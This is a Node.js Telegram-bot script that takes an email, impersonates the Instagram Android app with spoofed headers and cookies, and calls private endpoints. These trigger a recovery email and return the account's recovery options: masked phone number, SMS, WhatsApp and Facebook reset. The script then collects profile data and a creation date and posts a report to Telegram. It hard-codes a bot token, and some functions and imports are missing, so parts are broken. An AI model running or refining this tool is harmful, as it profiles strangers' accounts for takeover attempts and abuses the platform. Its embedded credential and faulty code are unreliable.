const axios = require('axios');
const uuid = require('uuid');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Bot is running...');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

// Helper functions
function generateUserAgent() {
    // Implement a user agent generator or use a library
    return 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)';
}

function tokenHex(size) {
    return crypto.randomBytes(size).toString('hex');
}

// Main function
async function getInstagramInfo(token, ID) {
    const uid = uuid.v4();
    const csr = tokenHex(8).repeat(2);

    // Request email from user via Telegram bot
    await sendMessage(token, ID, "Please enter your email:");
    const email = await waitForUserResponse(token);

    const headers = {
        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': generateUserAgent(),
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
    };

    const data = {
        signed_body: `0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"${uuid.v4()}","guid":"${uuid.v4()}","device_id":"${uuid.v4()}","query":"${email}"}`,
        ig_sig_key_version: '4',
    };

    try {
        const res = await axios.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', data, { headers });
        const rest = res.data.status === 'ok' ? res.data.email : 'Bad Request!';

        const user = email.split('@')[0];
        const heada = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Host": "i.instagram.com",
            "Connection": "Keep-Alive",
            "User-Agent": generateUserAgent(),
            "Cookie": `mid=YwvCRAABAAEsZcmT0OGJdPu3iLUs; csrftoken=${csr}`,
            "Cookie2": "$Version=1",
            "Accept-Language": "en-US",
            "X-IG-Capabilities": "AQ==",
            "Accept-Encoding": "gzip",
        };

        const datai = {
            q: user,
            device_id: `android${uid}`,
            guid: uid,
            _csrftoken: csr
        };

        const kidResponse = await axios.post('https://i.instagram.com/api/v1/users/lookup/', datai, { headers: heada });
        const kid = kidResponse.data;

        // Extract information from kid
        const id = kid.user?.pk || "";
        const prv = kid.user?.is_private || "";
        const ph = kid.has_valid_phone || "";
        const sms = kid.can_sms_reset || "";
        const fb = kid.fb_login_option || "";
        const wa = kid.can_wa_reset || "";
        const phn = kid.obfuscated_phone || "";
        const name = kid.user?.full_name || "";

        // Download profile picture
        if (kid.user?.profile_pic_url) {
            const profilePicResponse = await axios.get(kid.user.profile_pic_url, { responseType: 'arraybuffer' });
            fs.writeFileSync(`${user}.jpg`, profilePicResponse.data);
        }

        // Get additional info (implement GetInfoInsta function or use an appropriate API)
        const Response = await GetInfoInsta(user);

        const fols = Response.followers || "";
        const folg = Response.following || "";
        const po = Response.posts || "";

        // Get account creation date
        let da = 'No Date';
        try {
            const dateResponse = await axios.get(`https://o7aa.pythonanywhere.com/?id=${id}`);
            da = dateResponse.data.date;
        } catch (error) {
            console.error('Error fetching date:', error);
        }

        // Prepare the message
        const tlg = `
________main Info_______
[+] Email ==> ${email}
[+] E-mail Rest ==> ${rest}
[+] Username ==> @${user}
[+] Name ==> ${name}
[+] ID ==> ${id}
[+] Followers ==> ${fols}
[+] Following ==> ${folg}
[+] Posts ==> ${po}
[+] Date ==> ${da}
_______other Info_________    
[+] Is Private ==> ${prv}
[+] E-mail ==> ${email}
[+] Has Phone Number ? ==> ${ph}
[+] SMS Rest ==> ${sms}
[+] WhatsApp Rest ==> ${wa}
[+] FaceBook Login ==> ${fb}
[+] Phone Number ==> ${phn}
_______BEST Dev_________    
@maho_s9 - @maho9s
        `;

        console.log(tlg);

        // Send message and photo to Telegram
        await sendPhotoWithCaption(token, ID, `${user}.jpg`, tlg);

    } catch (error) {
        console.error('Error:', error);
    }
}

// Helper functions for Telegram bot
async function sendMessage(token, chat_id, text) {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    await axios.post(url, { chat_id, text });
}

async function getUpdates(token) {
    const url = `https://api.telegram.org/bot${token}/getUpdates`;
    const response = await axios.get(url);
    return response.data;
}

async function waitForUserResponse(token) {
    while (true) {
        const updates = await getUpdates(token);
        if (updates.result && updates.result.length > 0) {
            const lastMessage = updates.result[updates.result.length - 1].message;
            return lastMessage.text;
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
}

async function sendPhotoWithCaption(token, chat_id, photoPath, caption) {
    const url = `https://api.telegram.org/bot${token}/sendPhoto`;
    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('caption', caption);
    formData.append('photo', fs.createReadStream(photoPath));
    await axios.post(url, formData, {
        headers: formData.getHeaders()
    });
}

// Usage
const token = '7463685279:AAEtkWr1SqOQzUL5VAPK_rF-ZLtzEuO-pVQ';
const ID = '7193004338';
getInstagramInfo(token, ID);
